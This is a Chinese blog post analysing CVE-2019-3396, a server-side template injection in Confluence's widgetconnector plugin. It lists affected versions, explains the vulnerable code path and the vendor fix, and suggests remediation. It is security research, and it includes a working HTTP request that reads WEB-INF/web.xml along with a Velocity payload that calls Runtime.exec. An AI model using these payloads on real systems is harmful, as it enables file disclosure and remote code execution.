\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/)

Atlassian Confluence 远程代码执行漏洞分析
-------------------------------

**背景**
------

Confluence 是 Atlassian 公司出品的一款专业的企业知识管理与协同软件。  
该公司的 Confluence Server 和 Data Center 产品中使用的 widgetconnecter 组件 (版本<=3.1.3) 中存在服务器端模板注入 (SSTI) 漏洞。  
攻击者可以利用该漏洞实现对目标系统进行路径遍历攻击、服务端请求伪造 (SSRF)、远程代码执行 (RCE)。

**影响范围**
--------

### 产品

Confluence Server  
Confluence Data Center

### 版本

所有 1.xx，2.xx，3.xx，4.xx 和 5.xx 版本  
所有 6.0.x，6.1.x，6.2.x，6.3.x，6.4.x 和 6.5.x 版本  
所有 6.7.x，6.8.x，6.9.x，6.10.x 和 6.11.x 版本  
6.6.12 之前的所有 6.6.x 版本  
6.12.3 之前的所有 6.12.x 版本  
6.13.3 之前的所有 6.13.x 版本  
6.14.2 之前的所有 6.14.x 版本

### 组件

widgetconnector<=3.1.3

### 修复版本

版本 6.6.12 及更高版本的 6.6.x.  
版本 6.12.3 及更高版本的 6.12.x  
版本 6.13.3 及更高版本的 6.13.x  
版本 6.14.2 及更高版本

**漏洞分析与复现**
-----------

### １. 安装与注册使用版

通过官方的下载页面可以按照需要下载不同的版本，下载链接如下，https://www.atlassian.com/software/confluence/download-archives，  
随便选择了个比较低的版本，选择的版本为 atlassian-confluence-6.9.3-x64.exe。  
第一次装完，发现起不来，手动启动也只是瞬间关闭，后来发现是因为没有在安装时给管理员权限。  
等到安装完毕会跳转到输入 Licence 页面，可以选择试用，并在 atlassian.com 注册一个账号即可获得一个试用 30 天的 Licence  
安装完毕页面

![](https://blog.riskivy.com/wp-content/uploads/2019/04/71132673848a1ace282595c16fdc689c.png)

### ２. 修改启动参数，调试

Confluence 在 Windows 平台是通过 tomcat 注册服务启动的，可以在服务中看到名称以 Confluence 开头的服务

![](https://blog.riskivy.com/wp-content/uploads/2019/04/d5a1af03ed7ea97b2580088f561a7e0d.png)

在控制台中启动  
`tomcat9w.exe //ES//Confluence030419234341`  
`//ES//`表示编辑服务的意思，会弹出一个服务属性窗口，可以对相关属性进行修改，  
这里为了调试，需要在 Java Options 输入框中加入如下选项，然后点击确定重启服务即可。  
`-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5000`

给 idea 配置一个远程调试配置选项，在 idea 端的 Run/Debug 配置窗体里点击 “+”，新建一个远程调试配置文件，  
其中 Transport 选择 Sockoet, Debug Mode 选择 Attach, 端口填入 5000,  
由于 Confluence 和 idea 都在同一台机子上，这里地址填写 localhost 即可

![](https://blog.riskivy.com/wp-content/uploads/2019/04/cddb636bd3ca67ca5a23e5045b12eb83.png)

### ３. 代码简单分析

Widgetconnector.jar 位于 confluence\\WEB-INF\\atlassian-bundled-plugins\\，目录下，根据目录可以知道这是一个插件，且是官方自带的一个插件，  
该插件实现的功能在编辑器中表现为 “Macro”，官方名字为 Widget Connector Macro，  
该 Macro 可以在页面中嵌入图片，视频，幻灯片等等。  
该 Macro 支持的内容可以来自如下站点，YouTube，Vimeo，MySpace Video。  
在编辑中选择该 Macro 的示例图如下：

![](https://blog.riskivy.com/wp-content/uploads/2019/04/b34ae53aebf223cded2ad49005d2745a.png)

各个站点的内容不一样表现形式肯定不一样，需要有不同的判断方法，通过调用父类 WidgetRenderer 的 matches 方法来判断调用不同的子类。  
判断的内容来自 url 参数，所以在 payload 中的 url 参数中必须要包含特定的字串才能加载有漏洞的子类。  
在不同的子类中的 getEmbeddedHtml 函数中有的将\_template 参数硬编码了，有的没有传递，表示使用默认的模板

![](https://blog.riskivy.com/wp-content/uploads/2019/04/1531bf90f716fb4bb0d7fc04d7d650fd.png)

![](https://blog.riskivy.com/wp-content/uploads/2019/04/cd196cd2efca0e47f288c3bf2727bf90.png)

### ４. 漏洞复现，模板本地加载

将相关文件导入到 idea 中，选择查看 Widgetconnector.jar 中的  
com.atlassian.confluence.extra.widgetconnector.video.DailyMotionRenderer 类，  
在 getEmbeddedHtml 函数中打断点。  
发送如下请求

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: www.riskivy.xyz:8091
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Referer: http://www.riskivy.xyz:8091/
Content-Length: 169

{"contentId":"0","macro":{"name":"widget","body":"","params":{"url":"http://localhost/www.dailymotion.com/","width":"300","height":"200","\_template":"WEB-INF/web.xml"}}}


```

![](https://blog.riskivy.com/wp-content/uploads/2019/04/4cbc845ee78798423248697ae7b80ce6.png)  
注意到 params 的 template 参数由用户输入，跟进 velocityRenderService 的 render，  
\_template 最终跳到了 VelocityUtils.getRenderedTemplate 方法中, 当成模板路径被加载。  
调用的加载类来进行资源的加载，你会发现用”../” 无法穿越到系统根目录，此时对路径会限定在当前 WEB 路径，但是可以使用 file 协议加载非 WEB 路径的资源。

![](https://blog.riskivy.com/wp-content/uploads/2019/04/3a6edcffad0ca3b33c4fb191cb988f30.png)

### 4.1 漏洞复现，模板远程加载

经过测试，可以直接加载 https，ftp 远程文件，其加载类为 tomcat 提供的 WebappClassLoader.。远程模板内容可为

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('calc').toString()


```

![](https://blog.riskivy.com/wp-content/uploads/2019/04/748b925cb2d3f9a4e25efc264e26be74.png)

下图的 classLoader 为 Tomcat 提供的 WebappClassLoader

![](https://blog.riskivy.com/wp-content/uploads/2019/04/b311689e16c82fe3bc3d667b7234e762.png)

最终 WebappClassLoader 是调用的为 jdk 提供的 URLClassLoader 的 findResource 方法，

![](https://blog.riskivy.com/wp-content/uploads/2019/04/ad9db304a6008ebd7b49859ad4eeca5c.png)

findResource 是不支持 http 协议的。

![](https://blog.riskivy.com/wp-content/uploads/2019/04/12308f971b2e1298f5604c434b1e0138.png)

### 5\. 官方修复方法

在 WidgetMacro 的构造函数中对属性 sanitizeFields 添加了如下值

```
  this.sanitizeFields = Collections.unmodifiableList(Arrays.asList(new String\[\] { "\_template" }));


```

并会调用 doSanitizeParameters 方法，该方法会将 parmeters 变量中的\_template 参数移除，所以用户对于 \_template 参数不再可控。

![](https://blog.riskivy.com/wp-content/uploads/2019/04/7f804233326b38caf8f454606a9b607a.png)

该修复方法杜绝了该插件中的 SSTI 漏洞，但是其中还有几处盲 SSRF 未修复，可能是官方认为风险可接受吧。

**修复方案**
--------

1\. 升级 Confluence 版本  
2\. 主动升级 widgetconnector-\*.jar 到 widgetconnector-3.1.4.jar  
3\. 删除或禁用 widgetconnector 插件

**参考**
------

https://www.freebuf.com/news/200183.html  
https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html